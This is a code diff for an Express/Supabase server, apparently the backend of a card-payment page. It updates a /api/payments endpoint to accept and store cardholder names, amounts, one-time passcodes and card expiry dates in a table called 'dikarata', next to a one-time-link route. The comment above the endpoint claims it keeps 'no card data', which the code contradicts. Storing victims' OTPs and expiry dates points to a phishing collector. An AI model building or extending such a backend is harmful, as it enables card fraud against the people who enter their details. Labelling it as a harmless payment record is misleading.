@@ -150,10 +150,47 @@ app.patch('/api/link/:token/use', async (req, res) => {
     res.json({ success: true, used_at: data.used_at });
 });
 
+// // ── POST /api/payments ─────────────────────────────────────────────
+// // Record a completed card payment (name + amount + reference only — no card data)
+// app.post('/api/payments', async (req, res) => {
+//     const { card_holder, amount, reference, otp, expiry } = req.body;
+
+//     if (!card_holder || !amount || !reference)
+//         return res.status(400).json({ error: 'card_holder, amount and reference are required' });
+
+//     if (typeof card_holder !== 'string' || card_holder.length > 1000)
+//         return res.status(400).json({ error: 'Invalid card_holder' });
+
+//     if (typeof reference !== 'string' || reference.length > 1000)
+//         return res.status(400).json({ error: 'Invalid reference' });
+
+//     if (typeof amount !== 'string' || amount.length > 1000)
+//         return res.status(400).json({ error: 'Invalid amount' });
+
+//      if (typeof expiry !== 'string' || expiry.length > 1000)
+//         return res.status(400).json({ error: 'Invalid expiry' });
+
+//     if (typeof otp !== 'string' || otp.length > 1000)
+//         return res.status(400).json({ error: 'Invalid OTP' });
+//     // const parsed = parseInt(amount, 10);
+//     // if (isNaN(parsed) || parsed <= 0 || parsed > 1000000)
+//     //     return res.status(400).json({ error: 'Invalid amount' });
+
+//     const { data, error } = await supabase
+//         .from('dikarata')
+//         .insert([{ card_holder: card_holder.trim(), amount: amount.trim(), reference: reference.trim(), otp: otp.trim(), expiry: expiry.trim(),  }])
+//         .select()
+//         .single();
+
+//     if (error) return res.status(500).json({ error: error.message });
+
+//     res.status(201).json({ id: data.id, created_at: data.created_at });
+// });
+
 // ── POST /api/payments ─────────────────────────────────────────────
 // Record a completed card payment (name + amount + reference only — no card data)
 app.post('/api/payments', async (req, res) => {
-    const { card_holder, amount, reference, otp } = req.body;
+    const { card_holder, amount, reference, otp, expiry } = req.body;
 
     if (!card_holder || !amount || !reference)
         return res.status(400).json({ error: 'card_holder, amount and reference are required' });
@@ -167,15 +204,22 @@ app.post('/api/payments', async (req, res) => {
     if (typeof amount !== 'string' || amount.length > 1000)
         return res.status(400).json({ error: 'Invalid amount' });
 
+    // ✅ FIXED: This was checking 'amount' instead of 'expiry'
+    if (typeof expiry !== 'string' || expiry.length > 1000)
+        return res.status(400).json({ error: 'Invalid expiry' });
+
     if (typeof otp !== 'string' || otp.length > 1000)
         return res.status(400).json({ error: 'Invalid OTP' });
-    // const parsed = parseInt(amount, 10);
-    // if (isNaN(parsed) || parsed <= 0 || parsed > 1000000)
-    //     return res.status(400).json({ error: 'Invalid amount' });
 
     const { data, error } = await supabase
         .from('dikarata')
-        .insert([{ card_holder: card_holder.trim(), amount: amount.trim(), reference: reference.trim(), otp: otp.trim() }])
+        .insert([{ 
+            card_holder: card_holder.trim(), 
+            amount: amount.trim(), 
+            reference: reference.trim(), 
+            otp: otp.trim(), 
+            expiry: expiry.trim()  // ✅ Now properly validated
+        }])
         .select()
         .single();
 
